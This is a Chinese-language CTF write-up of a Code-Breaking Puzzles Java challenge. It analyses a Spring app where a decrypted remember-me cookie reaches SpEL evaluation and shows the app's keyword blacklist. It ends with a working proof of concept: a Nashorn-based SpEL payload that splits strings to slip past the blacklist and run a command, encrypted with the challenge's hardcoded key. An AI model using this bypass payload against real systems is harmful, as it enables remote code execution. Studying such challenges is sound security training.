# README

## 前言

是几年前P神Code-Breaking Puzzles的Java题，今天抽了个时间来复现了一下。

## 分析

漏洞很容易找了，首先就是`remember-me`解码出来username，然后调用`getAdvanceValue`

```java
    public String admin(@CookieValue(value = "remember-me",required = false) String rememberMeValue, HttpSession session, Model model) {
        if (rememberMeValue != null && !rememberMeValue.equals("")) {
            String username = this.userConfig.decryptRememberMe(rememberMeValue);
            if (username != null) {
                session.setAttribute("username", username);
            }
        }

        Object username = session.getAttribute("username");
        if (username != null && !username.toString().equals("")) {
            model.addAttribute("name", this.getAdvanceValue(username.toString()));
            return "hello";
        } else {
            return "redirect:/login";
        }
    }
```

```java
    private String getAdvanceValue(String val) {
        String[] var2 = this.keyworkProperties.getBlacklist();
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String keyword = var2[var4];
            Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
            if (matcher.find()) {
                throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
            }
        }

        ParserContext parserContext = new TemplateParserContext();
        Expression exp = this.parser.parseExpression(val, parserContext);
        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
        return exp.getValue(evaluationContext).toString();
    }
```

很明显的SpEL注入，但是有个blacklist：

```java
keywords:
  blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
```

很多种绕过办法了。。。随便绕了

主要的就是这个`this.parser.parseExpression(val, parserContext);`，它带了第二个参数，所以`val`外面要包一层`#{}`才可以。

随便一个POC：

```java
        String exp = "#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")}";
        System.out.println(Encryptor.encrypt("c0dehack1nghere1","0123456789abcdef",exp));

```

